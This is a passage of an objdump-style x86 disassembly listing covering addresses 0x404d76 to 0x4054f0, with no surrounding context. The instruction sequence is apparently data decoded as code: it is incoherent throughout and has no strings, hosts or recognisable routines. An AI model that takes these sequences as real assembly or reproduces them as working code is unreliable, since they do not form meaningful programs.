  404d76:	pop    es
  404d77:	xor    BYTE PTR [edx+0x1],0x0
  404d7b:	dec    ebx
  404d7c:	add    BYTE PTR [eax],0x20
  404d7f:	add    BYTE PTR [eax],al
  404d81:	push   eax
  404d82:	or     BYTE PTR [ebx],al
  404d84:	xchg   edx,eax
  404d85:	add    BYTE PTR [eax+0x2],ah
  404d88:	or     BYTE PTR [edx+0x7],ah
  404d8b:	adc    DWORD PTR [edx],ecx
  404d8d:	push   eax
  404d8e:	add    BYTE PTR [eax+eax*1],ch
  404d91:	or     al,BYTE PTR [ecx]
  404d93:	add    BYTE PTR [eax+0x51],dl
  404d96:	add    al,0x88
  404d98:	in     al,0x80
  404d9a:	add    BYTE PTR [ebp+0x108cc040],cl
  404da0:	push   eax
  404da1:	add    BYTE PTR [eax+0x11005100],dl
  404da7:	add    al,BYTE PTR [eax]
  404da9:	add    BYTE PTR [eax],0x30
  404dac:	and    BYTE PTR [edx-0x68],dh
  404daf:	and    al,BYTE PTR [edx]
  404db1:	add    BYTE PTR [eax],al
  404db3:	dec    eax
  404db4:	adc    DWORD PTR [edx],esp
  404db6:	add    ah,al
  404db8:	rol    BYTE PTR [eax],0xc
  404dbb:	add    al,0x41
  404dbd:	pusha  
  404dbe:	adc    DWORD PTR [eax+0x60],eax
  404dc1:	add    al,BYTE PTR [eax]
  404dc3:	add    BYTE PTR [eax],al
  404dc5:	xor    BYTE PTR [esi+0x0],dl
  404dc8:	popa   
  404dc9:	add    BYTE PTR [eax],cl
  404dcb:	add    al,0xac
  404dcd:	add    eax,0x60004304
  404dd2:	add    DWORD PTR [eax+0x10],edx
  404dd5:	and    bh,BYTE PTR [eax+0x0]
  404dd8:	jb     0x404e1a
  404dda:	dec    eax
  404ddb:	adc    BYTE PTR [edx+eax*1+0x28],al
  404ddf:	add    BYTE PTR [eax+eax*1+0x52104094],al
  404de6:	inc    eax
  404de7:	add    al,0x0
  404de9:	add    BYTE PTR [eax],al
  404deb:	aaa    
  404dec:	add    BYTE PTR [esi+edx*1],0x0
  404df0:	inc    edx
  404df1:	pusha  
  404df2:	and    BYTE PTR [ecx+0x8],ah
  404df5:	jge    0x404dfe
  404df7:	and    al,0x0
  404df9:	inc    eax
  404dfa:	inc    eax
  404dfb:	sbb    BYTE PTR [eax],al
  404dfd:	and    BYTE PTR [ecx-0x5e],al
  404e00:	add    BYTE PTR [eax+eiz*1],cl
  404e03:	inc    eax
  404e04:	adc    DWORD PTR [ecx+0x53],ebx
  404e07:	sub    al,0x4
  404e09:	or     ah,BYTE PTR [ebx]
  404e0b:	ret    0x2046
  404e0e:	cmp    BYTE PTR [eax],0x21
  404e11:	adc    BYTE PTR [eax],0x34
  404e14:	and    DWORD PTR [ecx],eax
  404e16:	push   eax
  404e17:	and    DWORD PTR [eax],edx
  404e19:	add    BYTE PTR [eax],0x0
  404e1c:	and    BYTE PTR [ecx+0x4a8501],dl
  404e22:	and    BYTE PTR [eax],al
  404e24:	inc    ecx
  404e25:	add    BYTE PTR [eax],dh
  404e27:	add    BYTE PTR [ecx],0x1
  404e2a:	add    BYTE PTR [eax],0x4
  404e2d:	add    DWORD PTR [eax],eax
  404e2f:	inc    ecx
  404e30:	add    BYTE PTR [eax],0x20
  404e33:	add    al,al
  404e35:	adc    eax,DWORD PTR [edx-0x77b3feff]
  404e3b:	stos   BYTE PTR es:[edi],al
  404e3c:	lldt   WORD PTR [ecx-0x4dffbbff]
  404e43:	xchg   BYTE PTR [eax],al
  404e45:	cmp    BYTE PTR [eax+eax*1+0x61408040],dl
  404e4c:	add    BYTE PTR ds:0x40046008,cl
  404e52:	add    BYTE PTR [eax+0x4009401],0x0
  404e59:	adc    BYTE PTR [edx],ah
  404e5b:	sbb    al,BYTE PTR [esi]
  404e5d:	cmp    BYTE PTR [edx],al
  404e5f:	add    BYTE PTR [eax+0x0],al
  404e62:	add    eax,DWORD PTR [eax+0x11808220]
  404e68:	xor    al,BYTE PTR [edx]
  404e6a:	aam    0x16
  404e6c:	push   eax
  404e6d:	dec    eax
  404e6e:	push   es
  404e6f:	and    ch,BYTE PTR [eax+eax*1+0x0]
  404e73:	inc    esp
  404e74:	inc    eax
  404e75:	adc    BYTE PTR [eax+0x440844],al
  404e7b:	add    DWORD PTR [esp+eax*1],eax
  404e7e:	inc    esp
  404e7f:	add    al,0x4
  404e81:	add    BYTE PTR [eax],cl
  404e83:	or     dl,al
  404e85:	add    BYTE PTR [eax+0x1],al
  404e88:	inc    eax
  404e89:	jb     0x404e8f
  404e8b:	add    DWORD PTR [eax+eax*1],0x2182240
  404e92:	add    BYTE PTR [eax+0x0],al
  404e95:	add    BYTE PTR [ecx+0x11],al
  404e98:	add    BYTE PTR [eax+eax*2-0x7e],dl
  404e9c:	adc    al,0x0
  404e9e:	sbb    al,0x50
  404ea0:	and    BYTE PTR [eax],ch
  404ea2:	add    al,0x16
  404ea4:	mov    BYTE PTR [edx],dh
  404ea6:	mov    DWORD PTR [ecx],ebp
  404ea8:	and    al,0x40
  404eaa:	or     cl,BYTE PTR [eax]
  404eac:	inc    edx
  404ead:	add    BYTE PTR [eax+0x4],cl
  404eb0:	add    BYTE PTR [eax],al
  404eb2:	add    BYTE PTR [eax+0x0],al
  404eb5:	pusha  
  404eb6:	data16 add BYTE PTR [eax],al
  404eb9:	add    ah,BYTE PTR [edx]
  404ebb:	test   DWORD PTR [ecx+0x46021480],eax
  404ec1:	add    BYTE PTR [eax+edx*4-0x69f337fa],al
  404ec8:	add    al,0x15
  404eca:	or     BYTE PTR [eax+0x10003004],al
  404ed0:	xor    al,0x2
  404ed2:	mov    al,ds:0x103100a8
  404ed7:	add    DWORD PTR [ecx],eax
  404ed9:	add    al,dh
  404edb:	inc    eax
  404edc:	adc    al,al
  404ede:	add    DWORD PTR [esi+eax*4+0x4],edi
  404ee2:	adc    BYTE PTR ds:0x360238b0,cl
  404ee8:	add    BYTE PTR [eax-0x70fafcb0],al
  404eee:	push   es
  404eef:	or     ah,BYTE PTR [eax+0x6c3122]
  404ef5:	mov    al,ds:0x2088200
  404efa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404efb:	or     BYTE PTR [edx+eax*1],ah
  404efe:	add    BYTE PTR [eax],dl
  404f00:	inc    eax
  404f01:	add    DWORD PTR [edx],esp
  404f03:	add    BYTE PTR [ebx+0x22],ah
  404f06:	jl     0x404f10
  404f08:	add    DWORD PTR [eax],edx
  404f0a:	add    BYTE PTR [eax],ah
  404f0c:	add    BYTE PTR [ebx+0x1],dl
  404f0f:	or     WORD PTR [eax],ax
  404f12:	push   eax
  404f13:	add    BYTE PTR [ecx+0x2a88],ah
  404f19:	and    DWORD PTR [eax],ebp
  404f1b:	dec    eax
  404f1c:	xor    DWORD PTR [eax],edx
  404f1e:	or     BYTE PTR [eax],al
  404f20:	sub    BYTE PTR [eax],al
  404f22:	pusha  
  404f23:	inc    edx
  404f24:	and    DWORD PTR ds:0x88008100,eax
  404f2a:	nop
  404f2b:	or     BYTE PTR [eax+0x48],dh
  404f2e:	add    BYTE PTR [edx+0x52],al
  404f31:	and    eax,0x8600200
  404f36:	adc    eax,0x4201d5
  404f3b:	bound  eax,QWORD PTR [edx+eax*1]
  404f3e:	add    BYTE PTR [eax],dl
  404f40:	fwait
  404f41:	add    al,0xc3
  404f43:	sub    al,0x50
  404f45:	inc    eax
  404f46:	add    BYTE PTR [eax+eax*2+0x820002],al
  404f4d:	and    eax,0x2040011
  404f52:	sub    BYTE PTR [eax],al
  404f54:	push   eax
  404f55:	sahf   
  404f56:	dec    eax
  404f57:	xchg   ecx,eax
  404f58:	adc    al,BYTE PTR [edx+0x0]
  404f5b:	mov    cl,0x0
  404f5d:	add    DWORD PTR [eax],eax
  404f5f:	and    BYTE PTR [ebx],al
  404f61:	add    BYTE PTR [ecx+0x8],0x10
  404f65:	in     eax,0x0
  404f67:	inc    eax
  404f68:	mov    ds:0x88008010,al
  404f6d:	jb     0x404faf
  404f6f:	adc    BYTE PTR [eax-0x75ffffbc],al
  404f75:	add    BYTE PTR [eax+0x46a2280],al
  404f7b:	and    cl,BYTE PTR [ecx+0x8]
  404f7e:	rol    DWORD PTR [edx],0x80
  404f81:	or     dh,cl
  404f83:	test   BYTE PTR [eax],al
  404f85:	and    al,0x8
  404f87:	bound  esp,QWORD PTR [eax]
  404f89:	sbb    al,0x40
  404f8b:	push   ds
  404f8c:	arpl   WORD PTR [ebp+0x40281b81],ax
  404f92:	push   eax
  404f93:	add    BYTE PTR [eax],ah
  404f95:	dec    eax
  404f96:	add    al,BYTE PTR [eax+eax*1]
  404f99:	add    DWORD PTR [ecx],esi
  404f9b:	add    DWORD PTR [eax-0x7b99f800],eax
  404fa1:	add    al,BYTE PTR [eax]
  404fa3:	add    BYTE PTR [ecx+0x8c80360],0x2
  404faa:	inc    eax
  404fab:	ror    BYTE PTR [eax+0x70],0x4
  404faf:	test   BYTE PTR [ecx+0x40002800],bl
  404fb5:	add    DWORD PTR [edx-0x7e],eax
  404fb8:	add    BYTE PTR [edx+0x0],al
  404fbb:	add    al,BYTE PTR [eax]
  404fbd:	ror    DWORD PTR [eax],0x2
  404fc0:	adc    BYTE PTR [eax+0x2],al
  404fc3:	push   es
  404fc4:	add    BYTE PTR [eax],al
  404fc6:	or     al,BYTE PTR [eax+0x0]
  404fc9:	add    DWORD PTR [eax+0x43],eax
  404fcc:	mov    ah,BYTE PTR [ebx+0x42509c40]
  404fd2:	add    BYTE PTR [eax+0x100001],ah
  404fd8:	sub    eax,0x41022184
  404fdd:	ror    BYTE PTR [eax],0x40
  404fe0:	pushf  
  404fe1:	dec    ebx
  404fe2:	adc    al,BYTE PTR [eax*1-0x6df77fc0]
  404fe9:	add    DWORD PTR [edx],eax
  404feb:	add    cl,BYTE PTR [eax+0x42]
  404fee:	inc    edx
  404fef:	add    eax,0x8900
  404ff4:	and    BYTE PTR [edx],ah
  404ff6:	add    al,BYTE PTR [eax+0x10201904]
  404ffc:	add    BYTE PTR [ebx+0x8],cl
  404fff:	add    BYTE PTR [eax],al
  405001:	add    DWORD PTR [eax],eax
  405003:	mov    al,ds:0x2800c900
  405008:	add    DWORD PTR [eax+0x6],eax
  40500b:	and    BYTE PTR [eax-0x38],0xc8
  40500f:	or     eax,DWORD PTR [eax-0x60]
  405012:	add    BYTE PTR [ebx-0x6e],al
  405015:	adc    BYTE PTR [ecx+0x28080020],bh
  40501b:	add    BYTE PTR [edx],al
  40501d:	inc    eax
  40501e:	pusha  
  40501f:	inc    eax
  405020:	arpl   WORD PTR [eax],ax
  405022:	nop
  405023:	pusha  
  405024:	add    BYTE PTR [eax],al
  405026:	add    BYTE PTR [eax],ah
  405028:	and    BYTE PTR [ecx+0x0],al
  40502b:	test   DWORD PTR [eax],eax
  40502d:	add    DWORD PTR [eax-0x7c],edx
  405030:	dec    eax
  405031:	add    dl,BYTE PTR [ecx+0x48]
  405034:	inc    esi
  405035:	add    BYTE PTR [ecx],ah
  405037:	add    cl,ah
  405039:	xor    edx,DWORD PTR [eax+edx*1-0x1cdf9f60]
  405040:	ror    BYTE PTR [edi],cl
  405042:	add    BYTE PTR [ecx+0x8],al
  405045:	and    DWORD PTR [ecx+0x4],0xe2200200
  40504c:	or     BYTE PTR ds:0x19810808,bl
  405052:	add    BYTE PTR [edx],al
  405054:	add    BYTE PTR [eax],al
  405056:	add    esi,DWORD PTR [edx+0x42]
  405059:	sub    BYTE PTR [ebx],al
  40505b:	rol    BYTE PTR [eax],0x0
  40505e:	add    al,BYTE PTR [eax]
  405060:	add    BYTE PTR [eax],dh
  405062:	and    BYTE PTR [eax],al
  405064:	mov    BYTE PTR [eax],cl
  405066:	push   ebp
  405067:	add    BYTE PTR [eax],al
  405069:	and    BYTE PTR [si+0x40],al
  40506d:	mov    al,ds:0x410020
  405072:	add    al,0x4
  405074:	add    esp,DWORD PTR [ecx]
  405076:	add    dl,BYTE PTR [ecx+0x40520008]
  40507c:	add    BYTE PTR [edi],al
  40507e:	pusha  
  40507f:	add    ah,al
  405081:	adc    al,BYTE PTR [eax]
  405083:	and    BYTE PTR [eax+0x44087800],al
  405089:	add    al,0x2
  40508b:	and    BYTE PTR [ecx],dl
  40508d:	inc    eax
  40508e:	cs adc dl,al
  405091:	add    DWORD PTR [ecx+0x0],eax
  405094:	or     BYTE PTR ds:0x62d62200,al
  40509a:	add    BYTE PTR [ebp+0x44],dl
  40509d:	add    BYTE PTR [eax],0x1
  4050a0:	adc    BYTE PTR [eax],al
  4050a2:	add    BYTE PTR [eax+0x40],0x8
  4050a6:	add    BYTE PTR [eax-0x1f],dl
  4050a9:	add    DWORD PTR [eax+0x21],eax
  4050ac:	add    BYTE PTR [eax+eax*1],al
  4050af:	or     BYTE PTR [esp+eax*2],al
  4050b2:	inc    edx
  4050b3:	add    BYTE PTR [edx+eax*1+0x30e50000],al
  4050ba:	add    BYTE PTR [eax+0x18402440],dl
  4050c0:	add    BYTE PTR [edx],dl
  4050c2:	inc    eax
  4050c3:	inc    edx
  4050c4:	inc    eax
  4050c5:	and    BYTE PTR [eax],al
  4050c7:	add    BYTE PTR [eax+0x0],ah
  4050ca:	add    BYTE PTR [eax],al
  4050cc:	add    BYTE PTR [eax+eax*1+0x0],al
  4050d0:	add    DWORD PTR [eax+0x4],eax
  4050d3:	push   es
  4050d4:	xor    BYTE PTR [eax],al
  4050d6:	inc    esp
  4050d7:	mov    al,BYTE PTR [edx]
  4050d9:	add    BYTE PTR [eax+0x2041c222],al
  4050df:	sbb    BYTE PTR [eax],cl
  4050e1:	push   eax
  4050e2:	and    BYTE PTR [eax],al
  4050e4:	inc    eax
  4050e5:	inc    esp
  4050e6:	add    BYTE PTR [eax],al
  4050e8:	mov    edx,0x54040041
  4050ed:	dec    eax
  4050ee:	add    BYTE PTR [eax],dl
  4050f0:	add    BYTE PTR [edx+0x3a0142],0x0
  4050f7:	cdq    
  4050f8:	xor    eax,0xd3000042
  4050fd:	sar    BYTE PTR [ecx],0x86
  405100:	mov    al,ds:0xe0408010
  405105:	xor    BYTE PTR [eax],al
  405107:	and    BYTE PTR [eax],dl
  405109:	inc    eax
  40510a:	add    BYTE PTR [eax],al
  40510c:	dec    eax
  40510d:	adc    BYTE PTR [edx+0x10],0x63
  405111:	adc    BYTE PTR [esi],ah
  405113:	inc    edx
  405114:	add    BYTE PTR [eax+0x2],al
  405117:	popa   
  405118:	or     BYTE PTR [eax],dl
  40511a:	add    BYTE PTR [ebx],al
  40511c:	dec    edx
  40511d:	or     BYTE PTR [eax],dh
  40511f:	add    DWORD PTR [eax],0x20008000
  405125:	push   edx
  405126:	adc    eax,0x80000021
  40512b:	inc    edx
  40512c:	add    eax,0x26842022
  405131:	add    BYTE PTR [eax],cl
  405133:	pop    eax
  405134:	add    DWORD PTR [esi-0xe],esp
  405137:	mov    WORD PTR [ecx+edx*1+0x0],es
  40513b:	add    BYTE PTR [eax-0x6d],al
  40513e:	sbb    DWORD PTR [eax-0x7f],eax
  405141:	inc    eax
  405142:	add    BYTE PTR [eax+0x0],ah
  405145:	add    DWORD PTR [edx],eax
  405147:	adc    BYTE PTR [eax+0x18020041],al
  40514d:	add    BYTE PTR [eax],al
  40514f:	dec    eax
  405150:	and    BYTE PTR [eax],al
  405152:	and    dl,BYTE PTR [eax+esi*1+0x8a81007]
  405159:	mov    al,ds:0x84a3d80
  40515e:	adc    BYTE PTR [eax+0x0],0x42
  405162:	add    al,0x0
  405164:	dec    edx
  405165:	add    BYTE PTR [esp+ebx*4],0x44
  405169:	or     ah,BYTE PTR [eax+0x4c]
  40516c:	sub    eax,0x8480000
  405171:	add    BYTE PTR [eax],al
  405173:	dec    eax
  405174:	inc    eax
  405175:	add    al,0x6
  405177:	pusha  
  405178:	add    BYTE PTR [eax-0x47fcedf8],al
  40517e:	add    BYTE PTR [eax],al
  405180:	inc    eax
  405181:	xchg   ebx,eax
  405182:	inc    ebp
  405183:	add    al,0x2
  405185:	push   es
  405186:	add    al,cl
  405188:	or     BYTE PTR [edx],al
  40518a:	cwde   
  40518b:	and    al,0x0
  40518d:	aas    
  40518e:	adc    al,0x44
  405190:	inc    eax
  405191:	add    BYTE PTR [ecx-0x77ff7e79],al
  405197:	xchg   BYTE PTR [eax+eax*4],al
  40519a:	popa   
  40519b:	sub    al,BYTE PTR [eax]
  40519d:	inc    eax
  40519e:	adc    BYTE PTR [edx+eiz*1+0x50],0xc6
  4051a3:	inc    esp
  4051a4:	add    ah,bh
  4051a6:	add    BYTE PTR [ecx+eax*1],al
  4051a9:	les    eax,FWORD PTR [eax]
  4051ab:	add    DWORD PTR [eax],eax
  4051ad:	jp     0x40520f
  4051af:	adc    BYTE PTR [ecx-0x556fd660],al
  4051b5:	adc    BYTE PTR [eax],ah
  4051b7:	add    eax,DWORD PTR [eax+0x6b020000]
  4051bd:	add    DWORD PTR [edi],ecx
  4051bf:	xor    BYTE PTR [eax],0x9
  4051c2:	add    al,0x62
  4051c4:	add    DWORD PTR [edx-0x7ff3949e],0x1
  4051cb:	and    dh,BYTE PTR [ebx]
  4051cd:	add    al,BYTE PTR [eax+eax*1]
  4051d0:	mov    eax,0x4000014
  4051d5:	add    BYTE PTR [edx],0xf0
  4051d8:	or     BYTE PTR [ebx],ch
  4051da:	or     BYTE PTR [eax],al
  4051dc:	inc    eax
  4051dd:	test   BYTE PTR [ecx+0x1400e242],al
  4051e3:	add    BYTE PTR [edx],ah
  4051e5:	add    DWORD PTR [edx-0x78],eax
  4051e8:	add    al,BYTE PTR [eax+0x0]
  4051eb:	or     BYTE PTR [edx],bl
  4051ed:	and    eax,DWORD PTR [eax-0xfff3ac5]
  4051f3:	and    BYTE PTR [eax+0x0],al
  4051f6:	or     BYTE PTR [eax],al
  4051f8:	adc    al,BYTE PTR [ecx]
  4051fa:	and    al,0x8
  4051fc:	add    ah,al
  4051fe:	add    al,al
  405200:	inc    eax
  405201:	rol    BYTE PTR [eax],0x10
  405204:	and    BYTE PTR [esp+eax*4+0x2],ah
  405208:	add    BYTE PTR [eax],al
  40520a:	adc    BYTE PTR [ebx+0x28002480],al
  405210:	add    BYTE PTR [ecx+eiz*2+0x22],al
  405214:	inc    ecx
  405215:	sub    BYTE PTR [eax-0x3ffebfef],ah
  40521b:	add    DWORD PTR [ebx],ecx
  40521d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40521e:	add    ah,BYTE PTR [ecx]
  405220:	es and al,0x41
  405223:	rol    BYTE PTR [eax],0x0
  405226:	inc    eax
  405227:	add    al,BYTE PTR [eax]
  405229:	add    BYTE PTR [ebp+0xc0880c0],cl
  40522f:	push   es
  405230:	inc    esi
  405231:	adc    BYTE PTR [edx-0x7bfded40],0x0
  405238:	dec    eax
  405239:	add    BYTE PTR [eax+0xa0c404],al
  40523f:	dec    ecx
  405240:	test   BYTE PTR [eax],al
  405242:	add    eax,DWORD PTR [eax]
  405244:	sub    al,0x80
  405246:	add    al,0x0
  405248:	add    DWORD PTR [eax+0x0],0x41
  40524c:	add    al,BYTE PTR [eax]
  40524e:	add    al,0x10
  405250:	inc    ebp
  405251:	adc    eax,0x80980229
  405256:	pushf  
  405257:	inc    eax
  405258:	adc    eax,0x5450220
  40525d:	xor    BYTE PTR [eax],al
  40525f:	add    cl,BYTE PTR [eax+0x0]
  405262:	add    edx,DWORD PTR [eax+0x52010]
  405268:	inc    ebp
  405269:	add    DWORD PTR [eax+ebp*2],esp
  40526c:	xor    DWORD PTR [edx+0x4020200],edx
  405272:	test   al,0x9
  405274:	add    BYTE PTR [eax],al
  405276:	add    BYTE PTR [ecx-0x7dffc000],al
  40527c:	add    DWORD PTR [eax+0x1],edx
  40527f:	or     BYTE PTR [ecx+0x10],cl
  405282:	and    eax,DWORD PTR [esi]
  405284:	add    BYTE PTR [eax],dl
  405286:	sbb    DWORD PTR [eax+eax*1],esp
  405289:	add    BYTE PTR [ecx+0xe103600],al
  40528f:	add    BYTE PTR [ecx+eax*2],ah
  405292:	sub    BYTE PTR [eax],dh
  405294:	adc    BYTE PTR [edx-0x70],cl
  405297:	add    BYTE PTR [eax],al
  405299:	add    BYTE PTR [eax+0x4],dl
  40529c:	add    DWORD PTR [eax+0x6],ecx
  40529f:	and    BYTE PTR [eax],al
  4052a1:	add    ah,BYTE PTR [eax]
  4052a3:	add    al,BYTE PTR [eax-0x75]
  4052a6:	add    DWORD PTR [eax],0x401066ce
  4052ac:	add    BYTE PTR [esp+eiz*2-0x7ffdba0e],al
  4052b3:	fs inc ecx
  4052b5:	dec    esp
  4052b6:	push   esp
  4052b7:	add    BYTE PTR [eax],al
  4052b9:	lds    ebp,FWORD PTR [eax]
  4052bb:	adc    BYTE PTR [ecx+0x41],al
  4052be:	dec    esp
  4052bf:	and    cl,BYTE PTR [edx]
  4052c1:	or     BYTE PTR [eax-0x5fd5edc0],ah
  4052c7:	add    BYTE PTR [ecx],dl
  4052c9:	add    BYTE PTR [ecx+eiz*2],al
  4052cc:	mov    BYTE PTR [eax],cl
  4052ce:	add    ah,al
  4052d0:	add    BYTE PTR [eax],al
  4052d2:	adc    al,BYTE PTR [ecx]
  4052d4:	add    BYTE PTR [eax],al
  4052d6:	add    BYTE PTR [ecx+eax*1+0x4e],al
  4052da:	add    DWORD PTR [eax+0x60006100],eax
  4052e0:	add    DWORD PTR [ecx-0x80],0x587002e4
  4052e7:	add    BYTE PTR [eax+edx*1],0x0
  4052eb:	push   esi
  4052ec:	add    al,BYTE PTR [eax+0x38]
  4052ef:	adc    DWORD PTR [ecx],esi
  4052f1:	inc    ecx
  4052f2:	add    BYTE PTR [eax],al
  4052f4:	add    cl,BYTE PTR [eax+ecx*1]
  4052f7:	cmp    BYTE PTR [eax],al
  4052f9:	add    BYTE PTR [esi+eiz*1],al
  4052fc:	inc    eax
  4052fd:	and    BYTE PTR [ecx],al
  4052ff:	xor    al,BYTE PTR [eax]
  405301:	add    BYTE PTR [eax],al
  405303:	push   eax
  405304:	add    al,0x22
  405306:	add    BYTE PTR [edx],0x14
  405309:	inc    eax
  40530a:	add    DWORD PTR [eax+eax*1+0x10],eax
  40530e:	add    al,0x0
  405310:	adc    BYTE PTR [edx],bl
  405312:	push   ecx
  405313:	add    BYTE PTR [eax],cl
  405315:	and    DWORD PTR [eax],esi
  405317:	add    BYTE PTR [eax],al
  405319:	add    al,0x81
  40531b:	in     al,0x6
  40531d:	add    BYTE PTR [eax+0x15880b5],0x0
  405324:	add    DWORD PTR [eax+0x0],eax
  405327:	add    al,0x50
  405329:	sub    BYTE PTR [ecx],dl
  40532b:	add    al,0x2
  40532d:	add    BYTE PTR [eax],al
  40532f:	add    al,BYTE PTR [eax-0x18]
  405332:	jb     0x405336
  405334:	add    DWORD PTR [edx],0x22004008
  40533a:	add    BYTE PTR [eax],al
  40533c:	inc    esp
  40533d:	add    BYTE PTR ds:0x10030400,0x59
  405344:	test   BYTE PTR [eax+edx*1+0x80802b],al
  40534b:	add    BYTE PTR [eax],al
  40534d:	add    al,al
  40534f:	add    dh,cl
  405351:	pop    eax
  405352:	nop
  405353:	add    BYTE PTR [eax+0x10],al
  405356:	add    al,BYTE PTR [ecx+0xcc084]
  40535c:	inc    ecx
  40535d:	adc    al,BYTE PTR [eax]
  40535f:	dec    ecx
  405360:	inc    eax
  405361:	inc    BYTE PTR [eax+0x20]
  405364:	add    eax,0x41828001
  405369:	add    BYTE PTR [eax+0x0],al
  40536c:	inc    edx
  40536d:	inc    ecx
  40536e:	add    BYTE PTR [eax+0x11104aa],al
  405374:	add    BYTE PTR [eax],bl
  405376:	or     BYTE PTR [eax],al
  405378:	add    DWORD PTR [eax],eax
  40537a:	inc    eax
  40537b:	cmp    BYTE PTR [eax],al
  40537d:	shl    BYTE PTR [ecx],0x48
  405380:	pusha  
  405381:	add    al,al
  405383:	ds adc BYTE PTR fs:[eax+0x44],cl
  405388:	pop    esp
  405389:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40538a:	pusha  
  40538b:	and    eax,0x83a10140
  405390:	add    BYTE PTR [ebx+0x45000091],dl
  405396:	adc    BYTE PTR [eax],al
  405398:	and    al,0x4
  40539a:	add    DWORD PTR [ecx+0x10],ecx
  40539d:	add    al,0xb8
  40539f:	add    edx,DWORD PTR [edi]
  4053a1:	and    BYTE PTR [eax],dl
  4053a3:	or     BYTE PTR [eax],al
  4053a5:	pop    es
  4053a6:	inc    esp
  4053a7:	add    BYTE PTR [eax],al
  4053a9:	add    dl,BYTE PTR [ebx]
  4053ab:	adc    BYTE PTR [eax+0x2081060],dl
  4053b1:	adc    bh,BYTE PTR [eax-0x77f8bf00]
  4053b7:	or     BYTE PTR [ebx],al
  4053b9:	add    BYTE PTR [eax+0x0],al
  4053bc:	xchg   edx,eax
  4053bd:	and    BYTE PTR [edx+0x7001],0x58
  4053c4:	scas   al,BYTE PTR es:[edi]
  4053c5:	add    al,0x18
  4053c7:	add    DWORD PTR [eax],eax
  4053c9:	sub    BYTE PTR [edx],al
  4053cb:	adc    BYTE PTR [ecx+ebx*1],dl
  4053ce:	inc    esp
  4053cf:	adc    ebx,DWORD PTR [eax]
  4053d1:	add    BYTE PTR [eax],dl
  4053d3:	or     al,0x44
  4053d5:	or     DWORD PTR [edx-0x50],eax
  4053d8:	or     BYTE PTR [esi],al
  4053da:	add    BYTE PTR [eax],al
  4053dc:	add    BYTE PTR [eax],cl
  4053de:	add    DWORD PTR [eax],ecx
  4053e0:	mov    ds:0x73407180,al
  4053e5:	jp     0x4053f7
  4053e7:	add    BYTE PTR [ecx],dl
  4053e9:	adc    al,0x0
  4053eb:	shl    BYTE PTR [eax+0x40002880],0x4
  4053f2:	add    BYTE PTR [eax],cl
  4053f4:	add    dh,BYTE PTR [eax+eiz*1]
  4053f7:	adc    al,al
  4053f9:	data16 add BYTE PTR [eax],al
  4053fc:	add    DWORD PTR [eax],eax
  4053fe:	adc    BYTE PTR [edx],al
  405400:	add    BYTE PTR [eax],al
  405402:	push   eax
  405403:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405404:	or     BYTE PTR [eax],ah
  405406:	add    BYTE PTR [eax-0x80],0xa0
  40540a:	add    BYTE PTR [ecx],bl
  40540c:	add    BYTE PTR [eax],al
  40540e:	add    BYTE PTR [eax],cl
  405410:	add    BYTE PTR [eax],al
  405412:	add    DWORD PTR [eax+0x20],eax
  405415:	sub    al,BYTE PTR [eax]
  405417:	push   edx
  405418:	add    BYTE PTR [eax+0x72],cl
  40541b:	and    BYTE PTR [eax+edx*1+0x0],0x82
  405420:	or     BYTE PTR [edx+0x40521153],al
  405426:	nop
  405427:	mov    cl,BYTE PTR [eax-0x6]
  40542a:	or     BYTE PTR [eax],al
  40542c:	add    DWORD PTR [edx],eax
  40542e:	lds    eax,FWORD PTR [eax+0x2900a002]
  405434:	shl    BYTE PTR ds:0x25008020,1
  40543a:	rcl    DWORD PTR [ecx],1
  40543c:	or     eax,ebx
  40543e:	add    eax,0xc0006060
  405443:	add    al,0x0
  405445:	or     BYTE PTR [esi+eax*2],cl
  405448:	arpl   WORD PTR [ecx-0x7e],ax
  40544b:	add    al,0x0
  40544d:	push   cs
  40544e:	adc    cl,BYTE PTR [eax+0x50513921]
  405454:	and    BYTE PTR [eax+0x4c],al
  405457:	add    BYTE PTR [eax],al
  405459:	add    BYTE PTR [edx],dl
  40545b:	ret    0xc142
  40545e:	add    BYTE PTR [eax+0x40],0x90
  405462:	add    BYTE PTR [eax],cl
  405464:	add    dl,BYTE PTR [edx]
  405466:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405467:	xor    al,0x40
  405469:	inc    eax
  40546a:	add    al,0x13
  40546c:	and    dh,BYTE PTR [eax]
  40546e:	mov    al,es:0x20081
  405474:	les    edi,FWORD PTR [ecx]
  405476:	or     al,bl
  405478:	mov    DWORD PTR [eax],0x8001a1
  40547e:	inc    esi
  40547f:	and    DWORD PTR [eax],eax
  405481:	inc    eax
  405482:	adc    DWORD PTR [esi],esp
  405484:	sahf   
  405485:	adc    DWORD PTR [ecx],ecx
  405487:	add    BYTE PTR [eax],cl
  405489:	inc    esp
  40548a:	dec    eax
  40548b:	or     al,0x0
  40548d:	inc    eax
  40548e:	inc    eax
  40548f:	push   0x821a80
  405494:	add    BYTE PTR [ecx],al
  405496:	add    BYTE PTR [edx],al
  405498:	add    DWORD PTR [ebx+0x1004202],eax
  40549e:	add    BYTE PTR [eax+0x14c06c0],dl
  4054a4:	and    ah,dh
  4054a6:	add    al,0x80
  4054a8:	add    BYTE PTR [ecx],al
  4054aa:	add    BYTE PTR [eax+ebp*1],al
  4054ad:	and    BYTE PTR ds:0x8960121,cl
  4054b3:	add    DWORD PTR [eax],0x20
  4054b6:	add    BYTE PTR [edx-0x731fecea],al
  4054bc:	add    BYTE PTR [eax],al
  4054be:	add    BYTE PTR [eax],al
  4054c0:	add    BYTE PTR [esi],al
  4054c2:	inc    eax
  4054c3:	add    BYTE PTR [eax],dl
  4054c5:	add    DWORD PTR [eax+0x500b8302],esp
  4054cb:	add    BYTE PTR [eax+0xa],0x0
  4054cf:	sbb    cl,al
  4054d1:	add    BYTE PTR [ebx+ebx*4-0x2bd7fffa],al
  4054d8:	add    al,ah
  4054da:	or     BYTE PTR [edx],al
  4054dc:	cdq    
  4054dd:	add    BYTE PTR [ebx],al
  4054df:	and    BYTE PTR [eax+0x60],dl
  4054e2:	add    BYTE PTR [eax],cl
  4054e4:	inc    eax
  4054e5:	add    BYTE PTR [eax],cl
  4054e7:	add    al,0xc
  4054e9:	sbb    al,0x1
  4054eb:	dec    esp
  4054ec:	push   edx
  4054ed:	pusha  
  4054ee:	add    BYTE PTR [eax],ah
  4054f0:	add    BYTE PTR [eax+0x212882ac],al
